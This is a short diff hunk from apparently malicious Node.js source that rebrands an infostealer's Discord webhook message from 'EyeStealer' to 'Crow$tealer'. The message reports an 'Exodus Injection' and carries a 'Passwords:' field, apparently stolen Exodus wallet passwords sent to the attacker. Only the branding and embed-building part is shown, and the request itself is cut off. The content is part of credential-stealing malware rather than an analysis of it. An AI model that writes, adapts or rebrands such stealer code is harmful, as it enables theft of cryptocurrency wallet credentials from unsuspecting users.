@@ -521,27 +521,27 @@ const os = require("os");
             content: null,
             embeds: [
               {
-                title: "EyeShield Exodus Injection",
+                title: "Crow$tealer Exodus Injection",
                 description: `\`\`\`diff\n- Path: ${__dirname}\`\`\``,
                 color: 8359053,
                 fields:[{
-                    name: "<:key_already_taken27:1133348230327963658> **Passwords:**",
+                    name: "<:crow:1170716733074587649> **Passwords:**",
                     value: `\`\`\`ansi
 [2;31m ${e ?? "N/A"}[0m[2;34m[0m\`\`\``,
                     inline: false,
                 }],
                 footer: {
-                  text: "@EyeStealer",
+                  text: "@Crow$tealer",
                   icon_url:
-                    "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
+                    "https://media.discordapp.net/attachments/1165678486762041454/1165714139860185240/9439d678-6318-431d-b7b1-c5fe4b1a04e0.png?ex=6547dae4&is=653565e4&hm=57bfe94a56bce9e67f260e14a618b9739cdb189355dfe5e9849718b56ce94f48&=&width=455&height=455",
                 },
                 thumbnail: {
-                  url: "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
+                  url: "https://media.discordapp.net/attachments/1165678486762041454/1165714139860185240/9439d678-6318-431d-b7b1-c5fe4b1a04e0.png?ex=6547dae4&is=653565e4&hm=57bfe94a56bce9e67f260e14a618b9739cdb189355dfe5e9849718b56ce94f48&=&width=455&height=455",
                 },
               },
             ],
-            username: "@EyeStealer",
-            avatar_url: "https://raw.githubusercontent.com/openyoureyesnow/assets/main/eye.png",
+            username: "Crow$tealer",
+            avatar_url: "https://media.discordapp.net/attachments/1165678486762041454/1165714139860185240/9439d678-6318-431d-b7b1-c5fe4b1a04e0.png?ex=6547dae4&is=653565e4&hm=57bfe94a56bce9e67f260e14a618b9739cdb189355dfe5e9849718b56ce94f48&=&width=455&height=455",
             attachments: [],
           };
           const options = {
